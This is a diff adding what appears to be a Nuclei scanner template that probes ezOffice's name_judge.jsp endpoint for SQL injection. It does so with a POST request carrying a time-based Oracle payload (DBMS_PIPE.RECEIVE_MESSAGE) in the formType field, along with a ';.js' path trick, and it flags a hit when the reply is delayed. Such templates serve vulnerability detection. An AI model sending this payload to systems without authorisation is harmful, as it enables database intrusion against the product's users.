@@ -1,0 +1,27 @@
+id: ezOffice-name_judge-sqlInjection
+
+info:
+  name: ezOffice-name_judge-sqlInjection
+  author: iSee857
+  severity: high
+  description: ezOffice-name_judge-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
+        Host: {{Host}}
+        Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+        formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',5)--&govFormName=&formId=
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
